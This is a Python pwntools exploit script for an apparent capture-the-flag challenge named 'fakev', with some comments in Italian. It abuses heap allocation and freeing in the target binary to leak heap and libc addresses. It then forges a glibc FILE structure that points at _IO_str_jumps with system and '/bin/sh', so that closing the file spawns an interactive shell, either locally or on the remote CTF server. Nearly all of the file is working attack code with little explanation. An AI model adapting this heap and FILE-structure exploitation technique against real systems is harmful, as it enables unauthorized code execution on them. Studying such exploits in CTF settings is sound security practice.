#!/usr/bin/env python3

from pwn import *

elf = ELF("./fakev_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = elf

# FAKE_FILE_STRUCT = flat({

# },)
if args.REMOTE:
    p = remote('fakev.challs.olicyber.it', 11004)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b main
        b add
        b close_file
        b read_content
        c
    ''')
else:
    p = elf.process()

def open_file(idx: int):
    p.sendlineafter(b': ',b'1')
    p.sendlineafter(b': ',str(idx).encode() + b'\x00' + b'a'*250)

def close_file():
    p.sendlineafter(b': ',b'4')

def read_file(idx: int):
    p.sendlineafter(b': ',b'2')
    p.sendlineafter(b': ', str(idx).encode())
    content = p.recv(240)
    return content

def expl_close(payload : bytes):
    p.sendlineafter(b': ', b'4' + b'\x00'*7 + payload)

def main():
    # good luck pwning :)
    for i in range(8):
        print(f"-- allocation number {i} -- ")
        open_file(1)
    
    for i in range(8):
        print(f"-- closing file {i} --")
        close_file()




    print("[...] Leaking heap")
    heap_leak = u64(read_file(7)[:8])
    heap_base = heap_leak - 0x8c50

    print(f"[=] LEAKED HEAP BASE: {hex(heap_base)} ")

    print("[...] Leaking libc")
    libc_leak = u64(read_file(1)[8:16])
    libc_base = libc_leak - 0x3ebca0
    libc.address = libc_base

    print(f"[=] LEAKED LIBC BASE: {hex(libc_base)} ")
    
    

    for i in range(9):
        print(f"-- allocation number {i} -- ")
        open_file(1)

    right_file_struct_ptr = heap_base + 0x9d60

    print(f"[*] Closing last file that has controllable stack pointer putting his right file struct at address {hex(right_file_struct_ptr)} [*]")

    FAKE_FILE_STRUCT = flat({
        0x0:0x0,
        0x38:0x602108 +0xf0, # argomento passato alla funzione a offset 0xe8 -> pointer a /bin/sh
        0x88: 0x6020A8, # lock --> richiede zona in memory r/w con degli zeri --> .data
        0xa0: 0x602108, # offset nella quale cè il pointer passato a fclose --> questa struct
        0xc0: 0x0,
        0xd8:libc.sym['_IO_str_jumps'],
        0xe8:libc.sym['system'],
        0xf0:b'/bin/sh\x00'
    },filler='\x00')
    payload = b'a'*152 + b'\x21' + b'\x00'*7 + p64(right_file_struct_ptr) + b'\x00'*8
    expl_close(FAKE_FILE_STRUCT)

    p.interactive()

if __name__ == "__main__":
    main()

# il valore dello stack salvato nell'heap puo forse essere controllato tramite get_index